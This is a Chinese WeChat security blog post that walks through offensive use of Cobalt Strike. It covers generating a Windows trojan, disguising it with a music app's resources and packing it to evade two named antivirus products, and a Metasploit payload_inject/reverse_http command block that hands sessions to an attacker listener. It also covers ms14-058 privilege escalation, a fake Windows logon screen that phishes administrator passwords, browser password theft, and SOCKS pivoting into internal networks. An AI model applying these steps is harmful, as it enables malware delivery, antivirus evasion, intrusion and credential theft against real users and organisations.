> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Lj7Ba3fzjsNE6JCupqrnbg)

**![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSEeYUN7BhZUQwpGkJ4ClfF25pLnHB2bfqMia5SShDA9Y5zeQGFKmiaxiahMo7z85VBV0tu9dVnkIRQCw/640?wx_fmt=png)**

**作者：掌控安全 - hpb1 分享！**

周六我一般会分享些工具，昨天发了个[哥斯拉的攻击分析](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247528324&idx=1&sn=eb7645a5ec70a4f825b54b9879fddd31&chksm=ebea26a9dc9dafbfb802810920658e4f2f0812b60dbccc42245d4e3b5900d04de7047afeca2d&scene=21#wechat_redirect)，今天就直接来一篇干货，关于 cs 这也是在后台常看见的消息，今天他来啦！

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSES975K0BTUbWLxnddz3nWVAyVJWL7QB7xiarfXbpM13YNp9gU7L81OTcfiaRibecOI89AqHdJR4OTaw/640?wx_fmt=jpeg)

#### 一. Cobaltstrike 简介

作为一款协同 APT 工具，功能十分强大，针对内网的渗透测试和作为 apt 的控制终端功能，使其变成众多 APT 组织的首选

fireeye 多次分析过实用 cobaltstrike 进行 apt 的案例。

#### Cobaltstrike 安装

CS 需要一个服务器来进行，我们把它放到服务器上。

然后运行`./teaserver ip 密码`即可。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsPdjTEXwLxfQbqSzkB5famLicjp1t9SqIZqdXysjebBQYXCsx9MGp7Ug/640?wx_fmt=png)  

然后使用 CS 客户端连接即可，输入对应 ip、端口和密码。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsB8dFqQAJZUKUjkwskicjK7IYMCuf5WIU4SX87O8MeAyWd1ic5j7SDvbg/640?wx_fmt=png)

#### Cobaltstrike 生成木马

首先创建监听器

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsaDxxsdj0icjeo7Ad8YzoJByryMYt31V4ds77yEce9ZiaKkwtJhMbh27A/640?wx_fmt=png)  
攻击 -》`生成后门-》windows executable`, 选择监听点击保存即可生成木马  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsaOGGPvYXDSOa64NMoBzGlFicyJZmkTnBmFJSAvqnfQzozibM21LBPicZA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhts33XJx64Vwib2snRW7nC05dTVTDf4JsxiamLb4P95uMuHhoam56BmCvcw/640?wx_fmt=png)  

不过 CS 生成木马已经被杀软加入病毒库，很容易别查杀，所以我们需进行一些免杀操作。

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSES975K0BTUbWLxnddz3nWVibia5x8NyTy4jZjkNhCibVrOibgCdOByGXdtAZtnNwiaUVDYCFuZxDAQ3DA/640?wx_fmt=jpeg)

#### 二. 常见免杀方式

1.  修改特征码
    
2.  花指令免杀
    
3.  加壳免杀
    
4.  内存免杀
    
5.  二次编译
    
6.  分离免杀
    
7.  资源修改
    

#### 三. 正文（资源修改 + 加壳组合免杀）

这里使用前辈的免杀木马脚本，虽然已经被加入病毒库了，但是通过常见免杀还是可以 Bypass 杀软。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtszPK3l47tg54oUP99gqBBsegw3iaWJsHvNGZbPu6enB4nKFxvcOHuwVQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsBKdcsXbeNoIvutkI18M8IphbvK4c0Dsd2q1PibaDibD13S6w0930Rnibg/640?wx_fmt=png)  
首先打开应用`Restorator`，拖进木马和网易云，把网易云所有资源信息都复制到木马上，点击保存即可。  

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsVibXiaXdsl6KlNDgC4Jw2baZbyM7XJ5tCTOuUZYSzsACWEMicMhXYDx0w/640?wx_fmt=png)  

不过这样子修改的话，还是不太行，还是被火绒查杀了

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsurL6icDmYqF8ib7uLRRqje6Os8hFibvD39xjXklC7SlC605Wg8mNOtXCA/640?wx_fmt=png)  

那么我们对这个木马，进行加壳，检测选项基本都勾上，点击`“保护”`即可生成。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsDyCkNo3xGFeKsPWgQEZV9glxCNFSO8uhwOKs1RRac1icYLWm4NQerfA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsiaaH4DkAKfXcnwQ97pNJka4TMrLP1oSJNw2iaibdEnAFcBD3UwXIMjlhw/640?wx_fmt=png)  

我们再打开杀软查杀，发现组合免杀生效了，绕过了火绒和 360

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsWib4TQoaPFViaOmbhLrYVVbBzeFaqrxibibbxsZWnMB2GuhzwCbegF2SVg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtswCIlxZNsjdTqx9zjicPWoWDE4hmltiaU6mFDL9DnEkTdVqm8fwK62SSg/640?wx_fmt=png)  

尝试运行看看是否会被查杀，可以看到没有拦截，成功上线了。  

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsnjI3vD0SVw15Let15MictdG3XEKXCTdH5hTL4GeObs4XG9G9icWJh9fw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsaDxxsdj0icjeo7Ad8YzoJByryMYt31V4ds77yEce9ZiaKkwtJhMbh27A/640?wx_fmt=png)

#### Cobalt strike 向 Msf 传递会话:

当我们获得一个 CS 木马会话时，那么该怎么传递到 msf 呢？

其实也挺简单的，再配置一个监听器，设置模块为`Foreign HTTP`。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtscjQNnVbU8DXU1fOicQp8hNvTwwHKT26syhenC6ZgsTFLHzwTTA3Ew8Q/640?wx_fmt=png)

配置好后在上线的主机上右击`Spawn（增加会话）`，选择`Foreign HTTP`监听模块，

这时候 msf 监听那边就会接收到会话

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsQicFY3xRGPorBZ907bSiaImsyrLLufYJXPNzx2g29YllZsezpdiah7h2w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsknZxO8Kse4Mt3zXX4yYgfWnAeplve6TtB9AzEmpPu4nrC4L548sLpQ/640?wx_fmt=png)

#### Msf 派生 shell 给 Cobaltstrike：

这里还是新建一个监听器，设置模块为`beacon HTTP`

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsGw1hVX7S99geNxkh4u6B5vdCcPFBgy5fO907krv2DrDEFfv0h2zvZw/640?wx_fmt=png)

接下来把 kali 上获得的`meterpreter会话`转发到`cobaltstrike主机`上，

这里我们需要用到一个`exploit模块`：

```
1.  exploit/windows/local/payload_inject

2.  set payload windows/meterpreter/reverse_http

3.  set DisablePayloadHandler true

4.  set lhost 192.168.43.147

5.  set lport  8081

6. set  session 4

7.  run
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsyljksL8dWMkIJibISmO3nbDGvS6chzl8ucqvt1RczGBFHAn1q3du8DA/640?wx_fmt=png)  

这时候返回客户端可以发现已经返回一个名为 CS 的会话

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsNgKuGF4ccpACJlQvGgR5KbrZ02fCV9PmmvzicopUx5wfbfNcOJeA4Bw/640?wx_fmt=png)

#### Cobaltstrike 提权

当我们拿到会话时，首先应该输入`sleep 1`来修改响应时间，

因为 cs 默认执行命令响应为`60/s`，这样子太慢了。

影响实验效率

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsSkXqpIHq8VP053qgO8oYDjLMgRUsibyuhibwA9fRCvQpeSYZyJGEMibibg/640?wx_fmt=png)  

**接下来要怎么提权呢？**

我们回到`beacon shell`输入`elevate`查看可用的提权脚本，发现只有两个。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsgDryJY7WCicQVibSqstIyOapHZMyj9PRx7a47nKiaycfKHjGnXUXtgzpw/640?wx_fmt=png)  

为了丰富我们的提权脚本，我们可以自己导入一个多提权脚本。

导入很简单：`cobalt strike-》脚本-》laod->选择要导入cna`即可。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsB2QEHnpp5X0baFeIyr34yYXCAarMzibOXQdUYeBibvmXObKOjMPgcHnQ/640?wx_fmt=png)

导入成功后，我们使用各个导入的脚本尝试提权：

`右键会话-》梼杌-》权限维持-》ms14-058`，

这时候可以看到返回一个`system的会话`，说明提权成功。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhts34nZODm2T7aTxXGPSKNjwrmTWqPFRVbZvyge9gUaqhEGOagvFUjmibA/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsetgJiczCp0rmpYnlOJvazz6y1zAyfzictL7JO1ZQpu0Fgq3IvPmMKwlg/640?wx_fmt=png)

#### Cobaltstrike 伪造 Windows 登录界面

有时候获取到会话时，因为目标系统版本过高，无法直接使用猕猴桃读取密码，还得去修改注册表，这就很麻烦。

这时候我们就可以用 c 语言写一个钓鱼的系统登录页面来窃取密码，在 beacon 输入命令`execute-assembly FakeLogonScreen.exe`即可

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtswusIN3s7luoPg6Bc7FVQqLaunguDsvsTZ6Iqm4iaBVMNLThohmJzBPQ/640?wx_fmt=png)

此时目标服务器弹出了登录页面，目标管理员一看到应该也没有什么怀疑，直接就输入密码。

这时候我们的 cs 客户端可以看到管理员输入的内容了。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhts4WWwVZk3ibSXCcyol88dzMB5ewicJ0gkEgB8hhYQkEtUUalE0T9PCpuw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsTOIa7CdX8AassicwdZH3JxZCY6oqMuV2jNiaYlBVqrzIUUTao8shw2eg/640?wx_fmt=png)  

#### 获取浏览器储存的密码

很多人为了操作方便，习惯性的将密码储存在浏览器中。

这使得攻击者可以利用人懒得特性，来进行获取存储在浏览器里的密码。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsAVWDrkG84esR6FRp6LogjWLcctPrlnKrar9K7ZuMiaIQ4ib2duqARMEw/640?wx_fmt=png)

#### 扫描内网网站

当我们拿下内网后，就可以扫描存在内网中的网站，因为很多测试网站都处于内网中且安全性低。这样就可以攻击内网网站了。  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsqJfB7ZaQmGUoibZjJoPHQOQibPYaQlAia66ibkTOtuicHqoibp2gtALOBicibQ/640?wx_fmt=png)

#### Cobaltstrike 代理

会话右键 -》中转 -》SOCKS Server 开启 socks4 代理，选择想要的端口，打开 proxifier 输入我们刚刚选择的端口即可，对内网做更多操作。        

  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhtsIGufeibpAMghUdhvia8zOegWRIK0j40TzBiaHSmFuqIn0crReAnVYKPfw/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcrbgTarG3OIv8wKObcGMhts2EbZz42KqhcuNLwnpGt1YbnewxFQok9xxSP0PJvLs2bAJgicJTwyL9w/640?wx_fmt=png)

**后台回复 "cs" 获取脚本** 

@

**欢迎加我微信：zkaq99、**实时分享安全动态

* * *

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSE8r6UDibLl3oFOu6cEZPryVrS6n7TfhmDVMfKfIfc7nicyXQ0r0CjPZxPIACeen4QF4fuLwsRBhzMw/640?wx_fmt=jpeg)

[

超级牛批的 IP 地址查询工具

2021-06-25

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGZPlHia3n9xfIeqNZlk2iaLpVMFV592QQBnFiaSkic2SHcxCMBib4mwYmk1RFiaHFddOCSly0js7gGlMrw/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247524023&idx=2&sn=f672c41128061e1577758d7ebd964a00&chksm=ebead79adc9d5e8c75e4a6af7b245b88077ede960ded86265fa14ac4e34611b3201d23be26b9&scene=21#wechat_redirect)

[

震惊！从一个 0day 到两个 0day 的奇妙之旅

2021-06-23

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHSACQCfISQ9OhkCryXs7d79jtRdYFNiaaUtctlHKAAFcjGS4ibmPqlGZ1DtWn4GQUgl6PJSib1XVAyQ/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247523571&idx=1&sn=4db6247e86abe84872c4ce090a9922e5&chksm=ebead5dedc9d5cc8ee27e5a6111d044124e4802536e7cac695e8f5cd7452b21df86b2143daad&scene=21#wechat_redirect)

[

黑客技能｜教你用手机代替各类门禁卡

2021-06-22

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSFmbvACy4WbM26IkAkBJJiaDx2nbLYAllV0PKE2Bgg0WpzliajxpsPZlSSIg2utbwtrsn2dJfuEQibQA/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247523367&idx=1&sn=b21ac7a31c017da78f7d45665fbc865b&chksm=ebead50adc9d5c1c006423d15e05ab402d023321f6fae6aaabc5c6876ff053faf9e77bf2b935&scene=21#wechat_redirect)

[

实战 | 偶遇一赌博网站，渗透诛之!

2021-06-20

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSEarCPgSd5meGe4fejblEbjJs3sd19Oiaecgqh2UI9t8FaESt2vWbQbRAcffVRufMMLCibzXvZcaticg/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247523181&idx=1&sn=2cf5471f209baf9bad0a9cf2cdfb5b8f&chksm=ebead240dc9d5b562eb7e90acc1a900c010176abea6ba15ca747b066b60b55e937fc6f2cac53&scene=21#wechat_redirect)

[

一条 Fofa 搜索语法，实现批量挖洞

2021-06-15

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGUIy41KKK40aUMdkCsia587omzM59hX1zMT0fupupLDznnkAN5BibQMe7liaNNwGc2okxeQ1XExlibfQ/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247522709&idx=1&sn=1470d7506167c835eaac4538a486c77f&chksm=ebead0b8dc9d59aeeac7b5d328146e8deab3fb1a25d650fb16d3575cba70e04a31079e7105ce&scene=21#wechat_redirect)

[

黑客技能｜断网攻击与监听演示

2021-06-04

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSE8YF0okRDl7zWnKCPoxDGUZeEaKAuibz1Wiaj3iaJJic8uoD1bVPIUv1hFKL5b1iauiclwiapBmAibEtjJEA/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247521713&idx=1&sn=ae4efd5b60465cf44be7b26e9abb5579&chksm=ebeadc9cdc9d558ad2b3dadf55a5571a0a5a52453248069186b2dc30101d9fc7b6cd5b88b343&scene=21#wechat_redirect)

[高段位隐藏 IP、提高溯源难度的几种实用方案！](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247520982&idx=1&sn=1a81ae558d471bbb84d89f3fe8b62039&chksm=ebeadbfbdc9d52ed27653fadc9c2b453028e31c8329dd0fc8034878b4124a94d4829d5f73f31&scene=21#wechat_redirect)

[2021-05-27](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247520982&idx=1&sn=1a81ae558d471bbb84d89f3fe8b62039&chksm=ebeadbfbdc9d52ed27653fadc9c2b453028e31c8329dd0fc8034878b4124a94d4829d5f73f31&scene=21#wechat_redirect)